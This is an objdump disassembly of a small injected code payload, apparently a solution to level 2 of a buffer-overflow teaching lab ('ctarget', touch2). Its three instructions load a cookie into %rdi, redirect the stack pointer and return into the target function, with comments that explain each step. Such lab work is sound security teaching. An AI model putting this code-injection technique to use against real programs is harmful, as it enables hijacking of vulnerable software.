
ctarget.l2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 3a 4e db 47 	mov    $0x47db4e3a,%rdi /* moves cookies into $rdi */
   7:	48 c7 c4 4c 18 40 00 	mov    $0x40184c,%rsp /* moves stack pointer to touch2 */
   e:	c3                   	retq   /* return to touch2 */
